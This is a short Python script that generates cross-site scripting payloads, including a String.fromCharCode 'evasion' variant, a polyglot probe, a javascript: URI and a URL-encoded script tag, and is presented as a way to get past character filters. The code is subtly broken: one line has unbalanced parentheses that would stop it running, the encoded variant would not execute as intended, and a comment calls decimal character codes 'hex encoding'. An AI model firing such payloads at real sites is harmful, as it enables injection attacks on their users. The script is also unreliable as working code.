import random
import string

def generate_payload():
    # Example payload that could be filtered
    base_payload = "<script>alert('XSS');</script>"
    
    # Modify the payload to evade character filters
    # Using hex encoding and other evasion techniques
    evasion_payload = (
        "alert(String.fromCharCode(" +
        ",".join(str(ord(c)) for c in base_payload)) + "));"
    )
    
    # Create a list of possible payloads with variations
    payloads = [
        base_payload,
        evasion_payload,
        "'';!--\"<XSS>=&{()};",
        "javascript:alert(1)",
        "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"  # URL encoded
    ]
    
    return random.choice(payloads)

# Generate and print an XSS payload
if __name__ == "__main__":
    print(generate_payload())
